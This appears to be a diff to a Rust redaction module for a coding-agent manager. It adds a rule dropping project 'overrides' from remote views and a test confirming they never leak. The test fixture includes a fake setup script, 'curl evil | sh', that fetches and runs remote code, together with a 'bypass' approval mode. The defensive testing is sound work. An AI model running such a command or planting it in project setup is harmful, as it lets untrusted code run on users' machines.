@@ -441,6 +441,8 @@ fn field_policy(path: &[String]) -> FieldPolicy {
     let key = path.last().map(String::as_str).unwrap_or("");
     match key {
         "providerSessionId" => FieldPolicy::Drop,
+        // Phase 1: a project's overrides hold its setup script (code) and a permission mode.
+        "overrides" => FieldPolicy::Drop,
         "customEnv" => FieldPolicy::CustomEnv,
         "customArgs" | "args" | "launchArgs" => FieldPolicy::ArgCount,
         "executablePath" => FieldPolicy::FileName,
@@ -882,6 +884,28 @@ mod tests {
                 None => assert!(expected.is_null(), "case {name}: expected a value, got null"),
             }
         }
+    }
+
+    #[test]
+    fn remote_never_sees_project_overrides() {
+        let options = RedactOptions::default();
+        let overrides = json!({ "models": { "codex": "m" }, "approvalMode": "bypass", "setupScript": "curl evil | sh" });
+        let projects = json!({ "projects": [{ "id": "p_1", "name": "Blolblex", "path": "C:/Users/sam/repos/bloblex", "overrides": overrides.clone() }] });
+        for method in ["project.list", "agent.projects"] {
+            let got = redact_result(method, &projects, &options);
+            assert_eq!(got["projects"][0]["name"], "Blolblex");
+            assert!(got["projects"][0].get("overrides").is_none(), "{method}: {got}");
+            assert!(!got.to_string().contains("curl evil"));
+        }
+        let snapshot = json!({ "projects": [{ "id": "p_1", "name": "Blolblex", "overrides": overrides.clone() }], "agents": [] });
+        let got = redact_snapshot(&snapshot, &options);
+        assert!(!got.to_string().contains("curl evil") && !got.to_string().contains("setupScript"));
+        // The project events are not sent to a device at all, and an allowed event still drops the key.
+        assert!(redact_event(&json!({ "type": "project.changed", "payload": { "action": "updated", "project": { "id": "p_1", "overrides": overrides.clone() } } })).is_none());
+        let got = redact_event(&json!({ "type": "agent.changed", "payload": { "project": { "overrides": overrides } } })).unwrap();
+        assert!(!got.to_string().contains("curl evil"));
+        // The remote cannot write them either.
+        assert!(rule_for("project.update").is_some_and(|rule| rule.class == MethodClass::Never));
     }
 
     #[test]
